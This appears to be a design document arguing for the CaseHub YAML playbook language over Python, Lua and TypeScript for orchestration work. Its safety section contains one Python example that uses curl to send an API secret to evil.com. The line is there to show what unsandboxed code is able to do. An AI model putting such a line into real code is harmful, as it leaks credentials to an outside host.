# CaseHub Playbook Language — Advantage Analysis

A systematic comparison of the CaseHub YAML playbook language against
imperative alternatives (Lua, Python, TypeScript) across real-world
orchestration use cases. Each category shows what the playbook expresses,
the equivalent imperative code, and where the advantage lies.

---

## Category 1: Progressive Disclosure

**What it is:** A new user can write their first playbook in 30 seconds.
Advanced features appear only when needed — the language doesn't front-load
complexity.

### Use Case 1.1: First Playbook

**CaseHub YAML:**
```yaml
steps:
  - action: send-email
    to: customer
```

**Python equivalent:**
```python
from casehub import Playbook, Step

pb = Playbook("my-first")

@pb.step
def send_email(ctx):
    email_service.send(ctx.params["to"])

pb.run()
```

**Advantage:** Zero imports, zero boilerplate, zero framework concepts.
The YAML IS the program. A non-programmer reads it and understands it
instantly. The Python version requires understanding imports, decorators,
context objects, and service references before writing "send email."

### Use Case 1.2: Adding Retry (Six Months Later)

**CaseHub YAML:**
```yaml
steps:
  - action: send-email
    to: customer
    retry: 3
```

**Python equivalent:**
```python
from casehub import Playbook, Step
from tenacity import retry, stop_after_attempt

pb = Playbook("my-first")

@pb.step
@retry(stop=stop_after_attempt(3))
def send_email(ctx):
    email_service.send(ctx.params["to"])

pb.run()
```

**Advantage:** The user added one word (`retry: 3`) to something they
already understood. No new import, no new decorator syntax, no new
library to learn. In Python, retry requires a third-party library
(tenacity), a new decorator, and understanding of its API.

---

## Category 2: Composition Without Complexity

**What it is:** Multiple behaviors compose on a single step via
orthogonal decorators. Each decorator is independent — adding one
doesn't affect the others.

### Use Case 2.1: Nine Decorators on One Step

**CaseHub YAML:**
```yaml
- action: process-claim
  at: >=100 pending-claims
  loop: continuous
  cancel: end-of-day
  resource: claims-api
  priority: high
  background: true
  retry: { max: 3, on: [TIMEOUT, RATE_LIMITED] }
  timeout: 30s
```

**Lua equivalent:**
```lua
local function process_claims()
    while not signals.end_of_day do
        if counters.pending_claims < 100 then
            coroutine.yield()  -- wait for threshold
        end

        local acquired = resource_pool:acquire("claims-api", PRIORITY_HIGH)
        if not acquired then
            coroutine.yield()
        end

        local ok, err
        for attempt = 1, 3 do
            ok, err = pcall(function()
                with_timeout(30, function()
                    process_claim()
                end)
            end)
            if ok then break end
            if err.category ~= "TIMEOUT" and err.category ~= "RATE_LIMITED" then
                break  -- don't retry permanent errors
            end
        end

        resource_pool:release("claims-api")
    end
end

coroutine.wrap(process_claims)()  -- background
```

**Advantage:** The YAML reads as a specification — nine independent
concerns declared as annotations. The Lua version interleaves nine
concerns into one control flow, creating a 25-line function where each
concern is tangled with the others. Changing the retry policy in YAML
means changing one line. In Lua, it means understanding the entire
function to know where retry logic lives.

### Use Case 2.2: Decorator Ordering is Guaranteed

**CaseHub YAML:**
```yaml
- action: call-api
  timeout: 30s
  retry: 3
```

**Question:** Does timeout apply per-retry or to all retries combined?

**Answer (YAML):** Per-retry. The decorator chain ordering is fixed:
timeout (position 7) is inside retry (position 10). This is guaranteed
by the language — the user doesn't choose, and can't get it wrong.

**Python equivalent:**
```python
@retry(stop=stop_after_attempt(3))
@timeout(30)
def call_api():
    ...
```

In Python, decorator ordering depends on stacking order, which the user
must get right. `@retry(@timeout)` and `@timeout(@retry)` have different
semantics, and both compile. The YAML eliminates this class of bug.

---

## Category 3: Concurrency Without Threads

**What it is:** Background execution, resource contention, and
priority-based scheduling — expressed declaratively, without the user
managing threads, locks, or coroutines.

### Use Case 3.1: Background Task with Priority Yielding

**CaseHub YAML:**
```yaml
resources:
  minerals: { concurrency: 1 }

steps:
  - train: PROBE
    loop: continuous
    resource: minerals
    priority: background
    background: true

  - build: PYLON
    at: 14 supply
    resource: minerals
    priority: high
```

**TypeScript equivalent:**
```typescript
const mineralsLock = new Mutex();
let running = true;

// Background probe production
const probeLoop = async () => {
  while (running) {
    await mineralsLock.acquire();
    try {
      await trainUnit("PROBE");
    } finally {
      mineralsLock.release();
    }
    await sleep(0); // yield to event loop
  }
};

// Main build order
const buildOrder = async () => {
  await waitUntil(() => supply >= 14);
  // How do we prioritize this over probeLoop?
  // Mutex doesn't support priority. Need a PriorityMutex.
  await mineralsLock.acquire();
  try {
    await buildStructure("PYLON");
  } finally {
    mineralsLock.release();
  }
};

Promise.all([probeLoop(), buildOrder()]);
```

**Advantage:** The YAML expresses "PROBE yields to PYLON when both
need minerals" as `priority: background` vs `priority: high`. No mutex
management, no manual yielding, no custom priority queue implementation.
The TypeScript version doesn't even solve the problem — standard Mutex
doesn't support priority, so you'd need to build `PriorityMutex` from
scratch. The YAML user doesn't know PriorityOrcSemaphore exists — they
just wrote `priority: high`.

### Use Case 3.2: Cancellable Background Group

**CaseHub YAML:**
```yaml
- block:
    cancel: army-phase
    steps:
      - train: PROBE
        loop: continuous
        resource: nexus
        background: true
      - build: PYLON
        loop: continuous
        at: supply-blocked
        background: true

- action: signal-transition
  at: >=22 workers
  signal: army-phase
```

**Advantage:** An entire production group cancelled by a single signal.
The `cancel:` on the block cascades to all children. In imperative code,
you'd need a shared cancellation token, manual propagation to each
coroutine, and cleanup logic. The YAML expresses "stop all of this when
that happens" in one line.

---

## Category 4: Safe by Construction

**What it is:** Entire classes of bugs are impossible in the YAML
language because the grammar doesn't permit them.

### Use Case 4.1: No Arbitrary Code Execution

**CaseHub YAML:**
```yaml
- action: process-payment
  amount: ${order.total}
  retry: { max: 3, on: [TIMEOUT] }
```

**What the user CAN'T do:**
- Import `os` and run shell commands
- Access the filesystem
- Make arbitrary network requests
- Leak secrets via logging
- Introduce infinite recursion
- Create memory leaks via closures

**Python equivalent can do ALL of these:**
```python
@pb.step
def process_payment(ctx):
    os.system("curl http://evil.com?secret=" + ctx.secrets["api_key"])
    # Nothing prevents this
```

**Advantage:** The YAML playbook is sandboxed by grammar. A compliance
officer can audit a YAML playbook and know EXACTLY what it can do —
because the language can't express anything else. Auditing Python code
requires understanding every import, every library, and every possible
side effect.

### Use Case 4.2: Resource Cleanup is Guaranteed

**CaseHub YAML:**
```yaml
- action: process-item
  resource: database-pool
  timeout: 30s
```

The resource is ALWAYS released — whether the step succeeds, fails,
times out, or is cancelled. This is guaranteed by the decorator chain's
`finally` blocks. The user can't forget to release a resource because
they never acquired one — the decorator handles the lifecycle.

**Python equivalent:**
```python
pool = await db_pool.acquire()
try:
    result = await asyncio.wait_for(process_item(), timeout=30)
finally:
    db_pool.release(pool)  # User must remember this
```

If the user forgets the `finally`, the connection leaks. If they put
the `release` in the wrong place, it leaks on timeout. The YAML makes
this impossible — the lifecycle is in the decorator, not the user's code.

### Use Case 4.3: Conditional Retry Prevents Harmful Retries

**CaseHub YAML:**
```yaml
- action: authenticate-user
  retry: { max: 3, on: [TIMEOUT, TRANSIENT] }
```

**What this prevents:** Retrying authentication with wrong credentials
(which triggers account lockout). The `on: [TIMEOUT, TRANSIENT]` means
only transient failures are retried. A `PERMANENT` failure (wrong
password) propagates immediately.

**Without conditional retry (common in imperative code):**
```python
@retry(max_attempts=3)
def authenticate(user, password):
    return auth_service.login(user, password)
# Retries wrong passwords → account locked after 3 attempts
```

---

## Category 5: Static Analysability

**What it is:** The YAML playbook can be validated, analysed, and
assisted by tools without executing it.

### Use Case 5.1: LSP / IDE Completions

**CaseHub YAML with JSON Schema:**
```yaml
- action: process-order
  re|  # ← cursor here
```

The IDE offers: `resource`, `retry`, `repeat`. Each with documentation,
type constraints, and valid values. This works because `StepSchemaComposer`
emits a JSON Schema with every decorator key, typed constraints, and
enum values.

**Lua equivalent:** No completions. The decorator is just a string key
in a table. The IDE doesn't know what keys are valid.

**Advantage:** Zero-cost tooling. The schema IS the documentation, the
validation, and the completion source. No language server to build, no
type stubs to maintain.

### Use Case 5.2: Offline Validation

**CaseHub YAML:**
```yaml
- action: build
  resource: minerls    # ← typo
  priority: high
```

Parse-time error: "Unknown resource 'minerls'. Declared resources:
minerals, gas, nexus." The playbook never executes — the error is
caught at parse time.

**Lua equivalent:** Runtime error after the step tries to acquire a
resource that doesn't exist. Discovered in production, not in the
editor.

### Use Case 5.3: Diffable and Auditable

```diff
- retry: 3
+ retry: { max: 3, on: [TIMEOUT] }
```

A one-line diff tells the reviewer exactly what changed: retry policy
now only retries timeouts. In Python, the equivalent change touches
imports (add tenacity), decorator stacking (add retry filter), and
possibly a custom retry predicate function. The diff is 10+ lines
across multiple locations.

---

## Category 6: Stream Processing as Composition

**What it is:** Multi-stage data pipelines emerge from composing
existing primitives — no stream DSL needed.

### Use Case 6.1: IoT Sensor Pipeline

**CaseHub YAML:**
```yaml
# Stage 1: Ingest
- action: read-sensor
  forEach: { in: sensors, as: sensor }
  loop: continuous
  delay: 30s
  background: true
  publish: { channel: raw-readings }

# Stage 2: Enrich (with retry)
- action: enrich-reading
  from: { channel: raw-readings, as: reading }
  retry: { max: 3, on: [TRANSIENT] }
  loop: continuous
  background: true
  publish: { channel: enriched }

# Stage 3: Alert (rate-limited, filtered)
- action: send-alert
  from: { channel: enriched, as: reading, filter: "${reading.severity} >= WARNING" }
  resource: alert-api
  priority: high
  loop: continuous
  background: true
```

**Java Streams equivalent:**
```java
sensorReadings.stream()
    .map(r -> enrichService.enrich(r))      // no retry
    .filter(r -> r.getSeverity() >= WARNING) // no rate limiting
    .forEach(r -> alertService.send(r));     // no backpressure
```

**Advantage:** Java Streams is more concise for the happy path but has
NO support for per-stage retry, rate limiting, resource contention,
backpressure, or cancellation. Adding any of these to Java Streams
requires breaking out of the stream API entirely. The YAML pipeline
gets all of them via decorator composition — each stage is independently
resilient because each stage is a full step with the complete decorator
set.

### Use Case 6.2: Fan-Out with Conditional Routing

**CaseHub YAML:**
```yaml
- action: classify-event
  from: raw-events
  loop: continuous
  background: true
  publish:
    - { channel: normal, if: "${result.class} == NORMAL" }
    - { channel: anomaly, if: "${result.class} == ANOMALY" }
    - { channel: critical, if: "${result.severity} >= CRITICAL" }
```

**Advantage:** Conditional fan-out to multiple channels in a single
declaration. The routing conditions are inline. No router classes, no
switch statements, no if-else chains.

---

## Category 7: Portability and Interchange

**What it is:** YAML playbooks are data — storable, transmittable,
versionable, and executable on any runtime.

### Use Case 7.1: Multi-Runtime Execution

The same YAML playbook runs on:
- **Java runtime** (yaml-step-runtime, virtual threads, j.u.c primitives)
- **TypeScript runtime** (pages, Node.js event loop, Promise-based)
- **Future runtimes** (Go, Rust, WASM — the YAML is the spec)

**Advantage:** Write once, run anywhere. The YAML is the portable
specification. The TS DSL and Java API are authoring surfaces for the
same execution model.

### Use Case 7.2: UI-Generated Playbooks

A drag-and-drop workflow builder generates YAML. The user never writes
YAML directly — they connect visual blocks. The YAML is the serialisation
format between the UI and the runtime.

**Why this doesn't work with code:** You can't drag-and-drop Python. Code
generation from UIs produces unmaintainable code that nobody reads. YAML
generation produces readable, editable, reviewable playbooks that a human
can modify after the UI generates them.

### Use Case 7.3: LLM-Generated Playbooks

An LLM can generate valid YAML playbooks from natural language:

> "Monitor temperature sensors every 30 seconds. If any reading exceeds
> 80 degrees, send an alert. Rate-limit alerts to 1 per minute."

```yaml
- action: read-temperature
  forEach: { in: sensors, as: sensor }
  loop: continuous
  delay: 30s
  background: true
  publish: { channel: readings }

- action: send-alert
  from: { channel: readings, filter: "${from.temperature} > 80" }
  resource: alert-api
  loop: continuous
  background: true
```

**Advantage:** The constrained grammar means the LLM can reliably
generate correct playbooks. JSON Schema provides the contract. Generating
correct Python/Lua from natural language is unreliable because the
output space is unbounded.

---

## Summary: Where YAML Wins and Where It Doesn't

| Dimension | YAML Advantage | Code Advantage |
|-----------|---------------|----------------|
| Entry barrier | Zero concepts to start | N/A |
| Composition | Orthogonal decorators, guaranteed ordering | Arbitrary composition (but error-prone) |
| Concurrency | Declarative, no threads/locks/coroutines | More flexible scheduling (custom schedulers) |
| Safety | Sandboxed by grammar, guaranteed cleanup | Can do anything (including dangerous things) |
| Tooling | Free from schema (LSP, validation, diffing) | Requires building language servers |
| Portability | Data format, multi-runtime, UI-generable | Tied to language runtime |
| Expressiveness | Limited to decorator vocabulary | Unlimited (closures, metaprogramming) |
| Performance | Interpretation overhead | Native execution (JIT, etc.) |
| Debugging | Declarative — less to debug | Imperative — step-through debuggers |
| Abstraction | Modules + parameters | Classes, functions, generics |

**The YAML wins when:**
- The audience includes non-programmers
- Safety and auditability matter more than flexibility
- Multiple runtimes or UIs need to produce/consume playbooks
- Tooling (completions, validation, diffing) is expected without investment
- The orchestration patterns fit the decorator vocabulary

**Code wins when:**
- Arbitrary computation is needed (complex data transforms, algorithms)
- The audience is exclusively programmers
- Performance is critical (tight inner loops)
- Custom abstractions beyond the decorator set are required
